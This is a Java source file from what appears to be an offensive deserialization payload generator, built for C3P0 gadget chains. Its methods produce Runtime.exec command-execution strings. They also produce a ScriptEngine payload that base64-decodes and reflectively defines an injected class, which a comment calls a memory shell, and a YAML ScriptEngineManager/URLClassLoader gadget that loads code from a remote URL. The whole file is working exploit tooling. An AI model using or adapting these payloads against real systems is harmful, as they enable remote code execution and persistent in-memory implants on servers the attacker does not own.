package com.ppp.sinks;

import com.ppp.JavaClassBuilder;
import com.ppp.JavaClassHelper;
import com.ppp.Printer;
import com.ppp.sinks.annotation.EnchantEnums;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.maker.CryptoUtils;

/**
 * @author Whoopsunix
 * <p>
 * C3P0 专门
 */
@Sink({Sink.C3P0})
public class C3P0 {
    /**
     * 远程类加载
     *
     * @param sinksHelper
     */
    @EnchantType({EnchantType.DEFAULT})
    public void remoteClassLoad(SinksHelper sinksHelper) {
        String url = sinksHelper.getUrl();

        Printer.yellowInfo("Remote url: " + url);
    }

    /**
     * 命令执行
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.Command})
    public String runtime(SinksHelper sinksHelper) {
        String command = sinksHelper.getCommand();
        EnchantEnums commandType = sinksHelper.getCommandType();

        Printer.blueInfo("command type: " + commandType);
        Printer.yellowInfo("command: " + command);

        String result;
        switch (commandType) {
            case Runtime:
                result = String.format("Runtime.getRuntime().exec(\"%s\")", command);
                break;
            case ScriptEngine:
                result = String.format("''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('%s')\")", command);
                break;
            default:
                result = command;
                break;
        }

        return result;
    }

    /**
     * 本地类加载
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.JavaClass})
    public String localLoad(SinksHelper sinksHelper) throws Exception {
        /**
         * 字节码加载
         */
        byte[] classBytes = null;
        String className = null;
        // 内存马
        JavaClassHelper javaClassHelper = sinksHelper.getJavaClassHelper();

        if (javaClassHelper != null) {
            classBytes = JavaClassBuilder.build(javaClassHelper);
            className = javaClassHelper.getCLASSNAME();
            System.out.println("Class Name: " + className);
        }


        if (classBytes == null) {
            Printer.error("Miss classBytes");
        }
        if (className == null) {
            Printer.error("Miss ClassName");
        }

        Printer.yellowInfo("Class load function is " + "javax.script.ScriptEngineManager");
        String b64 = CryptoUtils.base64encoder(classBytes);

        /**
         * javax.script.ScriptEngineManager
         */
        String code = "var data=\"" + b64 + "\";\n" +
                "var aClass = java.lang.Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                "var object = aClass.newInstance();\n" +
                "var bytes = aClass.getMethod(\"decodeBuffer\", java.lang.String.class).invoke(object, data);\n" +
                "var classLoader=new java.lang.ClassLoader() {};\n" +
                "var defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", \"\".getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "defineClassMethod.setAccessible(true);\n" +
                "var loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "loadedClass.newInstance();";

        String result = String.format("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval('%s')", code);
        return result;
    }

    @EnchantType({EnchantType.RemoteLoad})
    public String remoteLoad(SinksHelper sinksHelper) {
        String url = sinksHelper.getUrl();
        String remoteClassName = sinksHelper.getClassName();

        Printer.yellowInfo("Remote url: " + url);
        Printer.yellowInfo("Remote class name: " + remoteClassName);

        return String.format("!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"%s\"]\n" +
                "  ]]\n" +
                "]", url);
    }


}
